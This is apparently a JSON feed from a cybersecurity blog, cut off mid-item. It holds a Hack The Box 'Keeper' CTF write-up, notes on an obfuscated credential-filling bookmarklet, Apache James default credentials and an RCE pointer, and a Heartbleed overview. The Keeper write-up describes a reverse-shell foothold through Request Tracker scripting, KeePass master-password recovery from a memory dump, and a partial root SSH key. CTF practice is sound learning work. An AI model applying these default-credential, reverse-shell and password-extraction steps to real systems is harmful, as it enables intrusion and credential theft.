{
    "version": "https://jsonfeed.org/version/1",
    "title": "Spindel",
    "home_page_url": "https://mvineza.github.io/spindel/",
    "feed_url": "https://mvineza.github.io/spindel/feed.json",
    "description": "A minimalist, quick search cybersecurity blog and cheatsheets",
    "icon": "https://mvineza.github.io/spindel/apple-touch-icon.png",
    "favicon": "https://mvineza.github.io/spindel/favicon.ico",
    "expired": false,
    
    "author":  {
        "name": "spindel",
        "url": null,
        "avatar": null
    },
    
"items": [
    
        {
            "id": "https://mvineza.github.io/spindel/2023/12/25/hack-the-box-keeper",
            "title": "Hack The Box - Keeper",
            "summary": "Hack The Box - Keeper",
            "content_text": "Box InfoRating/Difficulty: easyReconNmap (TCP)# Nmap 7.94 scan initiated Sat Dec 23 10:48:29 2023 as: nmap -p- -sC -O -sV --min-rate=10000 -oN nmap.txt keeperNmap scan report for keeper (10.10.11.227)Host is up (0.035s latency).Not shown: 65533 closed tcp ports (reset)PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   256 35:39:d4:39:40:4b:1f:61:86:dd:7c:37:bb:4b:98:9e (ECDSA)|_  256 1a:e9:72:be:8b:b1:05:d5:ef:fe:dd:80:d8:ef:c0:66 (ED25519)80/tcp open  http    nginx 1.18.0 (Ubuntu)|_http-title: Site doesn't have a title (text/html).|_http-server-header: nginx/1.18.0 (Ubuntu)No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).TCP/IP fingerprint:OS:SCAN(V=7.94%E=4%D=12/23%OT=22%CT=1%CU=39778%PV=Y%DS=2%DC=I%G=Y%TM=658604OS:4D%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OPOS:S(O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CSTOS:11NW7%O6=M53CST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECOS:N(R=Y%DF=Y%T=40%W=FAF0%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=NOS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%COS:D=S)Network Distance: 2 hopsService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Sat Dec 23 10:49:01 2023 -- 1 IP address (1 host up) scanned in 31.89 secondsFootholdThe box is running request tracker app which I was able to login using default admin credentials of root:password.Ticketing systems normally have some scripting functionalities so I looked around and I found that it can execute perl scripts on a certain condition.Since I’m an admin, I created my own script and used a perl function to ping my attacker IP whenever a ticket is created.After creating that script, I created a ticket and after a few seconds I received a ping request. I modified my payload to a reverse shell command which gave me foothold to the box as www-data.Privilege EscalationDoing a quick look around the home directories, I found this interesting ZIP file./home/lnorgaard/RT30000.zipI copied it to my attacker box and I found Keepass memory dump and DB file.➜  loot file KeePassDumpFull.dmp                              KeePassDumpFull.dmp: Mini DuMP crash report, 16 streams, Fri May 19 13:46:21 2023, 0x1806 type➜  loot file passcodes.kdbx                   passcodes.kdbx: Keepass password database 2.x KDBX➜  loot Knowing that the box’ name is keeper, I looked around some keepass vulnerabilities and exploits and I found this blog.It allows anyone to extract majority of the master password characters from a memory dump due to the fact that keepass versions before 2.54 uses a managed string to store the characters of the master password.On that blog,  there is this tool that was reference. It can automate the password extraction so I ran it.➜  keepass-password-dumper git:(main) ✗ ~/.dotnet/dotnet run ../../loot/KeePassDumpFull.dmpFound: ●øFound: ●ø# ...Password candidates (character positions):Unknown characters are displayed as \"●\"1.:\t●2.:\tø, Ï, ,, l, `, -, ', ], §, A, I, :, =, _, c, M, 3.:\td, 4.:\tg, 5.:\tr, 6.:\tø, 7.:\td, 8.:\t , 9.:\tm, 10.:\te, 11.:\td, 12.:\t , 13.:\tf, 14.:\tl, 15.:\tø, 16.:\td, 17.:\te, Combined: ●{ø, Ï, ,, l, `, -, ', ], §, A, I, :, =, _, c, M}dgrød med fløde➜  keepass-password-dumper git:(main) ✗ Even using the tool, I still can’t figure out the password. It’s odd that there is a space on the master password and an unusual character ø . I looked around in Google about that generated string and I found this.Translating it to english results to this which looks like a type of dessert.I opened keepass database file and tried to use Rødgrød med fløde but it keeps crashing with this error.I tried pasting any random password without that special character and it worked fine so it looked like the linux keepass version I’m using is not happy with the special character.So I opened up a windows VM and used a native keepass. I was able to found that the password is rødgrød med fløde instead of Rødgrød med fløde.There is a private key in putty format inside the root credential.This may be the root SSH privatekey so I downloaded puttygen and converted it into an openssh private key format.-----BEGIN RSA PRIVATE KEY-----MIIEowIBAAKCAQEAp1arHv4TLMBgUULD7AvxMMsSb3PFqbpfw/K4gmVd9GW3xBdPc9DzVJ+A4rHrCgeMdSrah9JfLz7UUYhM7AW5/pgqQSxwUPvNUxB03NwockWMZPPfTykkqig8VE2XhSeBQQF6iMaCXaSxyDL4e2ciTQMt+JX3BQvizAo/3OrUGtiGhX6nFSftm50elK1FUQeLYZiXGtvSQKtqfQZHQxrIh/BfHmpyAQNU7hVW1Ldgnp0lDw1AMO8CC+eqgtvMOqv6oZtixjsV7qevizo8RjTbQNsyd/D9RU32UC8RVU1lCk/LvI7p5y5NJH5zOPmyfIOzFy6m67bIK+csBegnMbNBLQIDAQABAoIBAQCB0dgBvETt8/UF...As confirmed, this private key gave me root access to the box.Last login: Sat Dec 23 23:51:24 2023 from 10.10.14.62root@keeper:~# hostnamekeeperroot@keeper:~# iduid=0(root) gid=0(root) groups=0(root)root@keeper:~# Post AnalysisRT redirect: credentialsI notice when I go directly to http://tickets.keeper.htb the default admin credentials doesn’t work.It only works when I go first to the IP, then click the redirection link.Comparing the first and second request, I notice the referrer on the first has /rt/. That mostly likely means the proper endpoint to access is /rt/.I confirmed the credentials worked when I added /rt/.Without digging further, it looks like the CGI scripts are loaded on that endpoint as per the nginx config.root@keeper:/etc/nginx# cat sites-enabled/irt  | grep /rt            fastcgi_param  SCRIPT_NAME        \"/rt\";root@keeper:/etc/nginx# So when I removed it from the endpoint, the CGI scripts handling the authentication didn’t worked properly.RT redirect: burpWhen doing actions inside the app, most of the time I see this warning.If I choose to resume, the request failed because it goes to http://keeper.htb instead of http://tickets.keeper.htb.As a quick fix, I used burp’s match and replace rules to dynamically convert the host headers to http://tickets.keeper.htb.Easier foothold methodAfter doing the box, I looked at other peoples’ solution and I found out that the foothold is indeed way easier than the path I took (reverse shell).If I look at the user settings, I can see that user lnorgaard’s SSH credential is on the comment.I think my enumeration skills become rusty after not doing CTF for a long time.Keepass dump cronI looked around how the keepass dump file is generated and I saw this root cron that copies a static file to lnorgaard’s home directory.*/2 * * * * /usr/bin/cp /root/RT30000.zip /home/lnorgaard/I thought there is a real keepass app that is running in the background and some script that scrapes /proc to get the dump but there isn’t.root@keeper:/etc/nginx# dpkg -l | grep -i keepassroot@keeper:/etc/nginx# ps -ef | grep -i keepa | grep -v greproot@keeper:/etc/nginx# Hardening  Don’t put default credentials on user comments in RT. Make sure also to change the SSH creds as it is easy to brute force.  Upgrade keepass to 2.54.",
            "content_html": "<h2 id=\"box-info\">Box Info</h2><p><img src=\"/spindel/assets/Hack%20The%20Box%20-%20Keeper/4deb4eb2b5b8b43b969f0cecda095d5b.png\" alt=\"\" /></p><p>Rating/Difficulty: easy</p><h2 id=\"recon\">Recon</h2><h3 id=\"nmap-tcp\">Nmap (TCP)</h3><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># Nmap 7.94 scan initiated Sat Dec 23 10:48:29 2023 as: nmap -p- -sC -O -sV --min-rate=10000 -oN nmap.txt keeper</span>Nmap scan report <span class=\"k\">for </span>keeper <span class=\"o\">(</span>10.10.11.227<span class=\"o\">)</span>Host is up <span class=\"o\">(</span>0.035s latency<span class=\"o\">)</span><span class=\"nb\">.</span>Not shown: 65533 closed tcp ports <span class=\"o\">(</span>reset<span class=\"o\">)</span>PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 <span class=\"o\">(</span>Ubuntu Linux<span class=\"p\">;</span> protocol 2.0<span class=\"o\">)</span>| ssh-hostkey: |   256 35:39:d4:39:40:4b:1f:61:86:dd:7c:37:bb:4b:98:9e <span class=\"o\">(</span>ECDSA<span class=\"o\">)</span>|_  256 1a:e9:72:be:8b:b1:05:d5:ef:fe:dd:80:d8:ef:c0:66 <span class=\"o\">(</span>ED25519<span class=\"o\">)</span>80/tcp open  http    nginx 1.18.0 <span class=\"o\">(</span>Ubuntu<span class=\"o\">)</span>|_http-title: Site doesn<span class=\"s1\">'t have a title (text/html).|_http-server-header: nginx/1.18.0 (Ubuntu)No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).TCP/IP fingerprint:OS:SCAN(V=7.94%E=4%D=12/23%OT=22%CT=1%CU=39778%PV=Y%DS=2%DC=I%G=Y%TM=658604OS:4D%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OPOS:S(O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CSTOS:11NW7%O6=M53CST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECOS:N(R=Y%DF=Y%T=40%W=FAF0%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=NOS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%COS:D=S)Network Distance: 2 hopsService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Sat Dec 23 10:49:01 2023 -- 1 IP address (1 host up) scanned in 31.89 seconds</span></code></pre></div></div><h2 id=\"foothold\">Foothold</h2><p>The box is running <a href=\"https://github.com/bestpractical/rt\">request tracker</a> app which I was able to login using default admin credentials of <code class=\"language-plaintext highlighter-rouge\">root:password</code>.</p><p><img src=\"/spindel/assets/Hack%20The%20Box%20-%20Keeper/47389625bff13b1d3522417f525349a0.png\" alt=\"\" /></p><p>Ticketing systems normally have some scripting functionalities so I looked around and I found that it can <a href=\"https://docs.bestpractical.com/rt/4.4.3/customizing/scrip_conditions_and_action.html\">execute perl scripts </a>on a certain condition.</p><p><img src=\"/spindel/assets/Hack%20The%20Box%20-%20Keeper/4de0a403ce25bd7bd5edb3310271c3cd.png\" alt=\"\" /></p><p>Since I’m an admin, I created my own script and used a perl function to ping my attacker IP whenever a ticket is created.</p><p><img src=\"/spindel/assets/Hack%20The%20Box%20-%20Keeper/db52f08db844d5652fac1d7e5f0f79c1.png\" alt=\"\" /></p><p><img src=\"/spindel/assets/Hack%20The%20Box%20-%20Keeper/8740d21e1e883f939924413906ebd3ea.png\" alt=\"\" /></p><p>After creating that script, I created a ticket and after a few seconds I received a ping request. I modified my payload to a reverse shell command which gave me foothold to the box as <code class=\"language-plaintext highlighter-rouge\">www-data</code>.</p><h2 id=\"privilege-escalation\">Privilege Escalation</h2><p>Doing a quick look around the home directories, I found this interesting ZIP file.</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>/home/lnorgaard/RT30000.zip</code></pre></div></div><p>I copied it to my attacker box and I found Keepass memory dump and DB file.</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>➜  loot file KeePassDumpFull.dmp                              KeePassDumpFull.dmp: Mini DuMP crash report, 16 streams, Fri May 19 13:46:21 2023, 0x1806 <span class=\"nb\">type</span>➜  loot file passcodes.kdbx                   passcodes.kdbx: Keepass password database 2.x KDBX➜  loot </code></pre></div></div><p>Knowing that the box’ name is <code class=\"language-plaintext highlighter-rouge\">keeper</code>, I looked around some keepass vulnerabilities and exploits and I found this <a href=\"https://dev.to/tutorialboy/keepass-memory-leakage-vulnerability-analysis-cve-2023-32784-17nf\">blog</a>.</p><p>It allows anyone to extract majority of the master password characters from a memory dump due to the fact that keepass versions before 2.54 uses a managed string to store the characters of the master password.</p><p>On that blog,  there is this <a href=\"https://github.com/vdohney/keepass-password-dumper\">tool</a> that was reference. It can automate the password extraction so I ran it.</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>➜  keepass-password-dumper git:<span class=\"o\">(</span>main<span class=\"o\">)</span> ✗ ~/.dotnet/dotnet run ../../loot/KeePassDumpFull.dmpFound: ●øFound: ●ø<span class=\"c\"># ...</span>Password candidates <span class=\"o\">(</span>character positions<span class=\"o\">)</span>:Unknown characters are displayed as <span class=\"s2\">\"●\"</span>1.:\t●2.:\tø, Ï, ,, l, <span class=\"sb\">`</span>, -, <span class=\"s1\">', ], §, A, I, :, =, _, c, M, 3.:\td, 4.:\tg, 5.:\tr, 6.:\tø, 7.:\td, 8.:\t , 9.:\tm, 10.:\te, 11.:\td, 12.:\t , 13.:\tf, 14.:\tl, 15.:\tø, 16.:\td, 17.:\te, Combined: ●{ø, Ï, ,, l, `, -, '</span>, <span class=\"o\">]</span>, §, A, I, :, <span class=\"o\">=</span>, _, c, M<span class=\"o\">}</span>dgrød med fløde➜  keepass-password-dumper git:<span class=\"o\">(</span>main<span class=\"o\">)</span> ✗ </code></pre></div></div><p>Even using the tool, I still can’t figure out the password. It’s odd that there is a space on the master password and an unusual character <code class=\"language-plaintext highlighter-rouge\">ø</code> . I looked around in Google about that generated string and I found this.</p><p><img src=\"/spindel/assets/Hack%20The%20Box%20-%20Keeper/0a48ed521bc8cc067b4e46c53b9d50bf.png\" alt=\"\" /></p><p>Translating it to english results to this which looks like a type of dessert.</p><p><img src=\"/spindel/assets/Hack%20The%20Box%20-%20Keeper/8744e1e9b0ee55a9530220ba55770758.png\" alt=\"\" /></p><p>I opened keepass database file and tried to use <code class=\"language-plaintext highlighter-rouge\">Rødgrød med fløde</code> but it keeps crashing with this error.</p><p><img src=\"/spindel/assets/Hack%20The%20Box%20-%20Keeper/76b00dccb05045960ddbecc5bb92acbe.png\" alt=\"\" /></p><p>I tried pasting any random password without that special character and it worked fine so it looked like the linux keepass version I’m using is not happy with the special character.</p><p>So I opened up a windows VM and used a native keepass. I was able to found that the password is <code class=\"language-plaintext highlighter-rouge\">rødgrød med fløde</code> instead of <code class=\"language-plaintext highlighter-rouge\">Rødgrød med fløde</code>.</p><p><img src=\"/spindel/assets/Hack%20The%20Box%20-%20Keeper/47e049cf23a48585b4e7b06321cb6734.png\" alt=\"\" /></p><p>There is a private key in putty format inside the root credential.</p><p><img src=\"/spindel/assets/Hack%20The%20Box%20-%20Keeper/7517df4d9dab3bbc20774562498a4395.png\" alt=\"\" /></p><p>This may be the root SSH privatekey so I downloaded puttygen and <a href=\"https://upsource-support.jetbrains.com/hc/en-us/articles/206545529-Converting-PuTTY-private-keys-to-OpenSSH-format\">converted it into an openssh private key </a>format.</p><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>-----BEGIN RSA PRIVATE KEY-----MIIEowIBAAKCAQEAp1arHv4TLMBgUULD7AvxMMsSb3PFqbpfw/K4gmVd9GW3xBdPc9DzVJ+A4rHrCgeMdSrah9JfLz7UUYhM7AW5/pgqQSxwUPvNUxB03NwockWMZPPfTykkqig8VE2XhSeBQQF6iMaCXaSxyDL4e2ciTQMt+JX3BQvizAo/3OrUGtiGhX6nFSftm50elK1FUQeLYZiXGtvSQKtqfQZHQxrIh/BfHmpyAQNU7hVW1Ldgnp0lDw1AMO8CC+eqgtvMOqv6oZtixjsV7qevizo8RjTbQNsyd/D9RU32UC8RVU1lCk/LvI7p5y5NJH5zOPmyfIOzFy6m67bIK+csBegnMbNBLQIDAQABAoIBAQCB0dgBvETt8/UF...</code></pre></div></div><p>As confirmed, this private key gave me root access to the box.</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>Last login: Sat Dec 23 23:51:24 2023 from 10.10.14.62root@keeper:~# <span class=\"nb\">hostname</span>keeperroot@keeper:~# <span class=\"nb\">id</span><span class=\"nv\">uid</span><span class=\"o\">=</span>0<span class=\"o\">(</span>root<span class=\"o\">)</span> <span class=\"nv\">gid</span><span class=\"o\">=</span>0<span class=\"o\">(</span>root<span class=\"o\">)</span> <span class=\"nb\">groups</span><span class=\"o\">=</span>0<span class=\"o\">(</span>root<span class=\"o\">)</span>root@keeper:~# </code></pre></div></div><h2 id=\"post-analysis\">Post Analysis</h2><h3 id=\"rt-redirect-credentials\">RT redirect: credentials</h3><p>I notice when I go directly to <code class=\"language-plaintext highlighter-rouge\">http://tickets.keeper.htb</code> the default admin credentials doesn’t work.</p><p><img src=\"/spindel/assets/Hack%20The%20Box%20-%20Keeper/c1646c6887e53e6e03ce48704f04f924.png\" alt=\"\" /></p><p>It only works when I go first to the IP, then click the redirection link.</p><p><img src=\"/spindel/assets/Hack%20The%20Box%20-%20Keeper/447dc8cad530dfb330e3f22a3427df37.png\" alt=\"\" /></p><p><img src=\"/spindel/assets/Hack%20The%20Box%20-%20Keeper/181cda4bd86fee3c7b5aa2613073eab5.png\" alt=\"\" /></p><p>Comparing the first and second request, I notice the referrer on the first has <code class=\"language-plaintext highlighter-rouge\">/rt/</code>. That mostly likely means the proper endpoint to access is <code class=\"language-plaintext highlighter-rouge\">/rt/</code>.</p><p><img src=\"/spindel/assets/Hack%20The%20Box%20-%20Keeper/30d6944065ff854716ce66a9ccd7aa80.png\" alt=\"\" /></p><p>I confirmed the credentials worked when I added <code class=\"language-plaintext highlighter-rouge\">/rt/</code>.</p><p>Without digging further, it looks like the CGI scripts are loaded on that endpoint as per the nginx config.</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>root@keeper:/etc/nginx# <span class=\"nb\">cat </span>sites-enabled/irt  | <span class=\"nb\">grep</span> /rt            fastcgi_param  SCRIPT_NAME        <span class=\"s2\">\"/rt\"</span><span class=\"p\">;</span>root@keeper:/etc/nginx# </code></pre></div></div><p>So when I removed it from the endpoint, the CGI scripts handling the authentication didn’t worked properly.</p><h3 id=\"rt-redirect-burp\">RT redirect: burp</h3><p>When doing actions inside the app, most of the time I see this warning.</p><p><img src=\"/spindel/assets/Hack%20The%20Box%20-%20Keeper/8e8a43a00be2d4116aa069b26af233c5.png\" alt=\"\" /></p><p>If I choose to resume, the request failed because it goes to <code class=\"language-plaintext highlighter-rouge\">http://keeper.htb</code> instead of <code class=\"language-plaintext highlighter-rouge\">http://tickets.keeper.htb</code>.</p><p><img src=\"/spindel/assets/Hack%20The%20Box%20-%20Keeper/f68ba58764fcac2ba25a8801b38bfebe.png\" alt=\"\" /></p><p>As a quick fix, I used burp’s match and replace rules to dynamically convert the host headers to <code class=\"language-plaintext highlighter-rouge\">http://tickets.keeper.htb</code>.</p><p><img src=\"/spindel/assets/Hack%20The%20Box%20-%20Keeper/0f9f10d14218dea7109420af591b238e.png\" alt=\"\" /></p><h3 id=\"easier-foothold-method\">Easier foothold method</h3><p>After doing the box, I looked at other peoples’ solution and I found out that the foothold is indeed way easier than the path I took (reverse shell).</p><p>If I look at the user settings, I can see that user <code class=\"language-plaintext highlighter-rouge\">lnorgaard</code>’s SSH credential is on the comment.</p><p><img src=\"/spindel/assets/Hack%20The%20Box%20-%20Keeper/5592777b80f44c6cc328a94d52bf363d.png\" alt=\"\" /></p><p>I think my enumeration skills become rusty after not doing CTF for a long time.</p><h3 id=\"keepass-dump-cron\">Keepass dump cron</h3><p>I looked around how the keepass dump file is generated and I saw this root cron that copies a static file to <code class=\"language-plaintext highlighter-rouge\">lnorgaard</code>’s home directory.</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"k\">*</span>/2 <span class=\"k\">*</span> <span class=\"k\">*</span> <span class=\"k\">*</span> <span class=\"k\">*</span> /usr/bin/cp /root/RT30000.zip /home/lnorgaard/</code></pre></div></div><p>I thought there is a real keepass app that is running in the background and some script that scrapes <code class=\"language-plaintext highlighter-rouge\">/proc</code> to get the dump but there isn’t.</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>root@keeper:/etc/nginx# dpkg <span class=\"nt\">-l</span> | <span class=\"nb\">grep</span> <span class=\"nt\">-i</span> keepassroot@keeper:/etc/nginx# ps <span class=\"nt\">-ef</span> | <span class=\"nb\">grep</span> <span class=\"nt\">-i</span> keepa | <span class=\"nb\">grep</span> <span class=\"nt\">-v</span> <span class=\"nb\">grep</span>root@keeper:/etc/nginx# </code></pre></div></div><h2 id=\"hardening\">Hardening</h2><ul>  <li>Don’t put default credentials on user comments in RT. Make sure also to change the SSH creds as it is easy to brute force.</li>  <li>Upgrade keepass to <code class=\"language-plaintext highlighter-rouge\">2.54</code>.</li></ul>",
            "url": "https://mvineza.github.io/spindel/2023/12/25/hack-the-box-keeper",
            
            
            
            "tags": ["htb","keepass","rt"],
            
            "date_published": "2023-12-25T00:00:00+08:00",
            "date_modified": "2023-12-25T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/07/09/inspecting-javascript-codes",
            "title": "Inspecting Javascript Codes",
            "summary": "Inspecting Javascript Codes",
            "content_text": "Run in browser consoleBookmarkIn HTB Bitlab, it has this weird bookmark script.javascript:(function(){ var _0x4b18=[\"\\x76\\x61\\x6C\\x75\\x65\",\"\\x75\\x73\\x65\\x72\\x5F\\x6C\\x6F\\x67\\x69\\x6E\",\"\\x67\\x65\\x74\\x45\\x6C\\x65\\x6D\\x65\\x6E\\x74\\x42\\x79\\x49\\x64\",\"\\x63\\x6C\\x61\\x76\\x65\",\"\\x75\\x73\\x65\\x72\\x5F\\x70\\x61\\x73\\x73\\x77\\x6F\\x72\\x64\",\"\\x31\\x31\\x64\\x65\\x73\\x30\\x30\\x38\\x31\\x78\"];document[_0x4b18[2]](_0x4b18[1])[_0x4b18[0]]= _0x4b18[3];document[_0x4b18[2]](_0x4b18[4])[_0x4b18[0]]= _0x4b18[5]; })()I turned out that this code was used to populate user credentials in Gitlab.Static Code AnalysisWhen you where able to grab a copy of the code, here are different ways you can do:  Run npm audit to show vulnerabilitiesRabbithole for CTF MachinesI encountered this cool frontend app in HTB mango that connects to a public elasticsearch server.At first I though the elasticsearch is running inside the HTB machine, but it turned out it was a public elasticsearch server! In this scenarios, its better to move to another thing to enumerate since the public elasticsearch instance is out of scope of the HTB machine.",
            "content_html": "<h2 id=\"run-in-browser-console\">Run in browser console</h2><p><img src=\"/spindel/assets/Inspecting%20Javascript%20Codes/F4C58ADC-468C-40D7-A895-F54427062713.png\" alt=\"\" /></p><h2 id=\"bookmark\">Bookmark</h2><p>In HTB Bitlab, it has this weird bookmark script.</p><p><img src=\"/spindel/assets/Inspecting%20Javascript%20Codes/F9B89878-F4F4-4B3A-8ECD-C17B9D2056BE.png\" alt=\"\" /></p><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>javascript:(function(){ var _0x4b18=[\"\\x76\\x61\\x6C\\x75\\x65\",\"\\x75\\x73\\x65\\x72\\x5F\\x6C\\x6F\\x67\\x69\\x6E\",\"\\x67\\x65\\x74\\x45\\x6C\\x65\\x6D\\x65\\x6E\\x74\\x42\\x79\\x49\\x64\",\"\\x63\\x6C\\x61\\x76\\x65\",\"\\x75\\x73\\x65\\x72\\x5F\\x70\\x61\\x73\\x73\\x77\\x6F\\x72\\x64\",\"\\x31\\x31\\x64\\x65\\x73\\x30\\x30\\x38\\x31\\x78\"];document[_0x4b18[2]](_0x4b18[1])[_0x4b18[0]]= _0x4b18[3];document[_0x4b18[2]](_0x4b18[4])[_0x4b18[0]]= _0x4b18[5]; })()</code></pre></div></div><p>I turned out that this code was used to populate user credentials in Gitlab.</p><p><img src=\"/spindel/assets/Inspecting%20Javascript%20Codes/5EF6DD23-870A-4A1E-ABAC-A1574DD64CF7.png\" alt=\"\" /></p><h2 id=\"static-code-analysis\">Static Code Analysis</h2><p>When you where able to grab a copy of the code, here are different ways you can do:</p><ul>  <li>Run <code class=\"language-plaintext highlighter-rouge\">npm audit</code> to show vulnerabilities</li></ul><h2 id=\"rabbithole-for-ctf-machines\">Rabbithole for CTF Machines</h2><p>I encountered this cool frontend app in HTB mango that connects to a public elasticsearch server.</p><p><img src=\"/spindel/assets/Inspecting%20Javascript%20Codes/E08B4B10-E2EB-4FD4-823D-007B49212491.png\" alt=\"\" /></p><p><img src=\"/spindel/assets/Inspecting%20Javascript%20Codes/190D8175-4FA3-48C2-AA7B-686390CBD1E0.png\" alt=\"\" /></p><p>At first I though the elasticsearch is running inside the HTB machine, but it turned out it was a public elasticsearch server! In this scenarios, its better to move to another thing to enumerate since the public elasticsearch instance is out of scope of the HTB machine.</p>",
            "url": "https://mvineza.github.io/spindel/2022/07/09/inspecting-javascript-codes",
            
            
            
            "tags": ["web","javascript"],
            
            "date_published": "2022-07-09T00:00:00+08:00",
            "date_modified": "2022-07-09T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/07/08/apache-james",
            "title": "Apache James",
            "summary": "Apache James",
            "content_text": "OverviewApache James, a.k.a. Java Apache Mail Enterprise Server or some variation thereof, is an open source SMTP and POP3 mail transfer agent and NNTP news server written entirely in Java. James is maintained by contributors to the Apache Software Foundation, with initial contributions by Serge KnystautasPorts  4555/tcp - admin toolCredentials  Default credentials# for james admin on port 4555root:root  Setting password manually for a usersetpassword james pass123Some Exploits and Vulnerabilities  Authenticated RCE - once you sent your payload via adduser command, you need to trigger an SSH login for the payload to executesearchsploit james 2.3.2  Not a vulnerability, but more of a misconfiguration - you can change user passwords via admin tool 4445/tcp and use the new credentials to retrieve user emails via POPReferences  HTB SolidState",
            "content_html": "<h2 id=\"overview\">Overview</h2><p>Apache James, a.k.a. Java Apache Mail Enterprise Server or some variation thereof, is an open source SMTP and POP3 mail transfer agent and NNTP news server written entirely in Java. James is maintained by contributors to the Apache Software Foundation, with initial contributions by Serge Knystautas</p><h2 id=\"ports\">Ports</h2><ul>  <li>4555/tcp - admin tool</li></ul><h2 id=\"credentials\">Credentials</h2><ul>  <li>Default credentials</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># for james admin on port 4555</span>root:root</code></pre></div></div><ul>  <li>Setting password manually for a user</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>setpassword james pass123</code></pre></div></div><h2 id=\"some-exploits-and-vulnerabilities\">Some Exploits and Vulnerabilities</h2><ul>  <li>Authenticated RCE - once you sent your payload via <code class=\"language-plaintext highlighter-rouge\">adduser</code> command, you need to trigger an SSH login for the payload to execute</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>searchsploit james 2.3.2</code></pre></div></div><ul>  <li>Not a vulnerability, but more of a misconfiguration - you can change user passwords via admin tool 4445/tcp and use the new credentials to retrieve user emails via POP</li></ul><h2 id=\"references\">References</h2><ul>  <li>HTB SolidState</li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/07/08/apache-james",
            
            
            
            "tags": ["web","java","email"],
            
            "date_published": "2022-07-08T00:00:00+08:00",
            "date_modified": "2022-07-08T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/07/05/ssl-heartbleed",
            "title": "SSL Heartbleed",
            "summary": "SSL Heartbleed",
            "content_text": "OverviewThe SSL standard includes a heartbeat option, which allows a computer at one end of an SSL connection to send a short message to verify that the other computer is still online and get a response back. Researchers found that it’s possible to send a cleverly formed, malicious heartbeat message that tricks the computer at the other end into divulging secret information. Specifically, a vulnerable computer can be tricked into transmitting the contents of the server’s memory, known as RAM.CVE-2014-0160Versions Affected  SSL V3Public Exlploitsyou may need to run exploits multiple times to capture some output  from server memory such as scheduled processes  GitHub - mpgn/heartbleed-PoC: Hearbleed exploit to retrieve sensitive information CVE-2014-0160References  The Heartbleed Bug, explained - Vox  xkcd: Heartbleed Explanation",
